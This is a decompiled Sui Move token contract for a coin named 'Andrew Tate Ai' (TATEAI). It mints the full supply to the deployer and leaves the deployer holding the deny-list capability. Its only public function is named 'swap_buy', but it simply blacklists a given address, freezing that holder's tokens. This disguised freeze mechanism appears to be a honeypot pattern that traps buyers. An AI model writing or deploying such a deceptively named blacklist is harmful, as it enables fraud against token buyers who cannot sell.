module 0x6624e9e7594afcae8ea010293133d3ddf0ba67aa390bc1fb2cb0fd35cca75878::tateai {
    struct TATEAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TATEAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TATEAI>(arg0, 9, b"TATEAI", b"Andrew Tate Ai", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRURpmV1WqvqRHTWFK1CTa8EmoqfkyLkrfGKYTq12pEwN"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TATEAI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TATEAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TATEAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TATEAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TATEAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TATEAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

